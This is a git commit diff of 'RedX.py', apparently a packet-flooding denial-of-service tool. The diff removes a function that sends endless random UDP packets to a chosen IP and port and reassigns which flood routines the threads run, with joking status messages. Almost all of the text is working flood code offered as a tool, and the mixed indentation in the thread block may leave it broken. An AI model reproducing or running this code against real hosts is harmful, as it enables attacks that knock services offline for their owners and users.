0fc43a9ca0ccf75fb7fe05aebec8b902501e376c
Cryspot <94024627+Cryspot@users.noreply.github.com>
2021-11-27 21:27:23 +0700

    Update RedX.py

--- RedX.py
+++ RedX.py
@@ -67,26 +67,12 @@ def run3():
 			s.close()
 			print("\033[94m[*TOK*TOK*] PERMISI PAKET DATENG ")
 
-def run4():
-        data = random._urandom(1024)
-        i = random.choice(("[•]","[•]","[•]"))
-        while True:
-                try:
-                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                        addr = (str(ip),int(port))
-                        for x in range(times):
-                                s.sendto(data,addr)
-                        print("\033[92m[*TOK*TOK*] PERMISI PAKET DARI RedX DATENG")
-                except:
-                        print("\033[94m[*TOK*TOK*] PERMISI PAKET DATENG ")
 for y in range(threads):
 	if choice == 'y':
 		th = threading.Thread(target = run)
 		th.start()
 		th = threading.Thread(target = run2)
-		th.start()
-                th = threading.Thread(target = run3)
-                th.start()
+		th.start()               
 	else:
-		th = threading.Thread(target = run4)
+		th = threading.Thread(target = run3)
 		th.start()
